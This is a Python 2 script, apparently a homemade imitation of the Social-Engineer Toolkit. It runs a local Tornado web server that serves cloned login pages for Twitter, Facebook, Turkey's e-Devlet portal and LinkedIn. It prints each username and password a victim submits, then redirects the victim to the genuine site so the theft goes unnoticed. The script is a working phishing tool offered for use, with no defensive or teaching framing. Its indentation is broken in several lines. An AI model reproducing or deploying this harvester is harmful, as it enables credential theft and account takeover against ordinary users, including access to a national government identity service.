#My-Setoolkit.py
# -*- coding: utf-8 -*-
import tornado.ioloop
import tornado.web
#		adress		kullanıcı adı			şifre		redirect yapılacak olan
arr = {
    0 : ["Twitter.html" ,"session[username_or_email]","session[password]","https://twitter.com/login"],
    1 : ["Facebook.html","email"		         ,"pass"   	     ,"https://www.facebook.com" ],
    2 : ["E-devlet.html","tridField"		 ,"egpField"	     ,"https://giris.turkiye.gov.tr/Giris/gir"],
        3 : ["Linkedin.html","session_key" 		 ,"session_password","https://www.linkedin.com/"]
    }
stat =""
class MainHandler(tornado.web.RequestHandler):
    def get(self):
        global stat
        with open(arr[stat][0],"r") as file:
            tmp = file.read()
            self.write(tmp)
    def post(self):
        global stat
        u = self.get_body_argument(arr[stat][1], default=None, strip=False)
        p = self.get_body_argument(arr[stat][2],default=None, strip=False)
        print "Username :" , u
        print "Password :" , p
        self.redirect(arr[stat][3])

if __name__ == "__main__":
    print "#"*30
    print "1  -->	Twitter.html"
        print "2  -->	Facebook.html"
    print "3  -->	E-devlet.html"
    print "4  -->	Linkedin.html"
    print "#"*30
    stat = input("Select page number to show your local network :") -1
    addr = raw_input("Please enter to show your local network the ip address :")
    try:
        application = tornado.web.Application([(r"/", MainHandler),])
            application.listen(80,address=addr)
            tornado.ioloop.IOLoop.instance().start()
    except:
        print "You closed your local server"

